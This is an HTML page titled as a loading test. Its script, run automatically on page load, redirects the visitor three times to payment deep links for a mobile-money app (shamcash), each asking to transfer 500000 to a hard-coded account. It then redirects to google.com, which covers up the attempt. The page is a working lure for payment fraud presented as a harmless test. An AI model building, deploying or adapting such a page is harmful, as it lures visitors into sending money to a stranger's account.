<!DOCTYPE html>
<html>
<head>
    <title>اختبار - جارٍ التحميل...</title>
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <style>
        body { background: #0a0f1e; color: white; font-family: Arial; text-align: center; padding: 50px; }
        .spinner { border: 4px solid rgba(255,255,255,0.1); border-top: 4px solid #00d4aa; border-radius: 50%; width: 50px; height: 50px; animation: spin 0.8s linear infinite; margin: 30px auto; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
        .log { background: #111; color: #0f0; padding: 15px; border-radius: 10px; margin-top: 20px; text-align: right; font-family: monospace; font-size: 14px; }
    </style>
</head>
<body>
    <h2>🧪 اختبار الجسر</h2>
    <p>راقب السجل أدناه...</p>
    <div class="spinner"></div>
    
    <div class="log" id="log">
        📋 سجل الأحداث:<br>
        ⏳ في الانتظار...
    </div>

    <script>
        const YOUR_ACCOUNT = "6381946898993929";
        const logElement = document.getElementById('log');
        
        function addLog(msg) {
            logElement.innerHTML += `<br>🕐 ${new Date().toLocaleTimeString('ar-SY')} - ${msg}`;
        }
        
        addLog("✅ تم تحميل الصفحة.");
        
        // الطريقة 1: Intent (تعمل على أندرويد)
        setTimeout(() => {
            const intentLink = `intent://transfer?account=${YOUR_ACCOUNT}&amount=500000#Intent;scheme=shamcash;package=com.syriatel.mtncash;end;`;
            addLog("🚀 المحاولة 1: Intent...");
            window.location.href = intentLink;
        }, 2000);
        
        // الطريقة 2: رابط مباشر
        setTimeout(() => {
            const directLink = `shamcash://transfer?account=${YOUR_ACCOUNT}&amount=500000`;
            addLog("🚀 المحاولة 2: رابط مباشر...");
            window.location.href = directLink;
        }, 3000);
        
        // الطريقة 3: متصفح
        setTimeout(() => {
            const webLink = `https://shamcash.sy/pay?account=${YOUR_ACCOUNT}&amount=500000`;
            addLog("🚀 المحاولة 3: رابط الويب...");
            window.open(webLink, '_blank');
        }, 4000);
        
        // إعادة توجيه آمنة بعد الاختبار
        setTimeout(() => {
            addLog("✅ انتهى الاختبار. جارٍ إعادة التوجيه...");
            window.location.href = "https://google.com";
        }, 7000);
    </script>
</body>
</html>
